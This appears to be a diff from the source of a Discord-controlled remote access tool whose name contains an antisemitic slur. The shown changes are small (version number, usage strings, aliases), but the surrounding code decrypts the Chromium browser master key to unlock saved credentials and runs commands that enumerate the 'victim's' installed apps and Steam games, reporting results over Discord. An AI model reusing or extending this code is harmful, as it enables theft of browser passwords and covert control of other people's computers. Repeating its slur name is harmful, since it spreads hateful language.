@@ -54,7 +54,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.9.6" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.9.7" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon allowing you to exit the bot on the desktop easily, used for testing or if used as a remote desktop tool | Default: False - 28f93g
 
 intents = discord.Intents.all()
@@ -1426,7 +1426,7 @@ def launch_steam(name):
     print(f"[steam no match] '{raw_query}'")
     return None, "not found"
 
-@bot.command(help="launch a app from steam", usage="$app <query>")
+@bot.command(help="launch a app from steam", usage="$steam <query>")
 async def steam(ctx, *, query: str = ""):
     app, mode = launch_app(query)
     if app:
@@ -1450,7 +1450,7 @@ def get_master_key(local_state_path):
     encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
     return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
-@bot.command(aliases=["liststartapps"], help="Lists valid Start Menu shortcuts on the victim's system.", usage="$startapps")
+@bot.command(aliases=["liststartapps", "startlist"], help="Lists valid Start Menu shortcuts on the victim's system.", usage="$startapps")
 async def startapps(ctx):
 
     start_menu_paths = [
@@ -1490,7 +1490,7 @@ async def startapps(ctx):
     outputunsf = "\n".join(sorted(appsunsf)) or "No valid shortcuts found."
     await ctx.fm_send(output, outputunsf, "startmenu.txt", )
 
-@bot.command(aliases=["liststeamapps"], help="Lists installed Steam games with paths.", usage="$steamapps")
+@bot.command(aliases=["liststeamapps", "steamlist"], help="Lists installed Steam games with paths.", usage="$steamapps")
 async def steamapps(ctx):
     def get_steam_path():
         paths = []
